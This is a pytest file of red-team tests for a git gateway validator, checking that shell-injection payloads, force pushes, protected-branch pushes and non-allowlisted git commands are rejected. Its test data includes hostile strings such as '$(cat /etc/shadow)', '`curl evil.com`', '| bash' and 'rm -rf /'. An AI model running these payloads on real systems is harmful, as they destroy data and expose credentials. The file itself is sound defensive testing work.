"""Red-team tests for git_gateway — verify every attack vector is blocked.

Each test simulates a specific attack payload and asserts that
validate_operation() raises GitOperationForbidden.
"""

from __future__ import annotations

import pytest

from app.modules.git_gateway.service import (
    GitOperationForbidden,
    validate_operation,
)


class TestCommandSubstitution:
    """$() and backtick command substitution must be rejected."""

    def test_dollar_command_substitution(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("commit", ["-m", "$(whoami)"])

    def test_dollar_nested_command(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("commit", ["-m", "$(cat /etc/shadow)"])

    def test_backtick_command_substitution(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("commit", ["-m", "`cat /etc/passwd`"])

    def test_backtick_curl_exfil(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("commit", ["-m", "`curl evil.com`"])


class TestSemicolonInjection:
    """Semicolon-based command chaining must be rejected."""

    def test_semicolon_rm_rf(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format; rm -rf /"])

    def test_semicolon_curl(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format; curl evil.com"])


class TestPipeInjection:
    """Pipe-based command injection must be rejected."""

    def test_pipe_bash(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format | bash"])

    def test_pipe_sh(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format | sh"])

    def test_pipe_curl(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format | curl evil.com"])


class TestChainInjection:
    """&& chain injection must be rejected."""

    def test_double_ampersand_malicious(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format && malicious"])

    def test_double_ampersand_rm(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format && rm -rf /"])


class TestRedirectInjection:
    """Redirect-based attacks must be rejected."""

    def test_redirect_passwd(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format > /etc/passwd"])

    def test_redirect_shadow(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format > /etc/shadow"])


class TestProtectedBranchPush:
    """Push to main/master must be rejected."""

    def test_push_to_main(self) -> None:
        with pytest.raises(GitOperationForbidden, match="protected branch"):
            validate_operation("push", ["origin", "main"])

    def test_push_to_master(self) -> None:
        with pytest.raises(GitOperationForbidden, match="protected branch"):
            validate_operation("push", ["origin", "master"])

    def test_push_main_only(self) -> None:
        with pytest.raises(GitOperationForbidden, match="protected branch"):
            validate_operation("push", ["main"])


class TestForcePush:
    """push --force must be rejected."""

    def test_push_force(self) -> None:
        with pytest.raises(GitOperationForbidden, match="Blocked"):
            validate_operation("push", ["--force"])

    def test_push_force_lease(self) -> None:
        with pytest.raises(GitOperationForbidden, match="Blocked"):
            validate_operation("push", ["--force", "origin", "feature"])

    def test_push_force_with_dash_f(self) -> None:
        with pytest.raises(GitOperationForbidden, match="Blocked"):
            validate_operation("push", ["-f", "origin", "feature"])


class TestDisallowedOperations:
    """Operations not in the whitelist must be rejected."""

    def test_clean_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("clean", ["-fd"])

    def test_reflog_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("reflog", [])

    def test_clone_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("clone", ["https://evil.com/repo.git"])

    def test_stash_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("stash", [])

    def test_config_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("config", ["--global", "user.name", "evil"])

    def test_remote_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("remote", ["add", "evil", "https://evil.com"])

    def test_gc_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("gc", [])

    def test_reset_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("reset", ["--hard", "HEAD~1"])
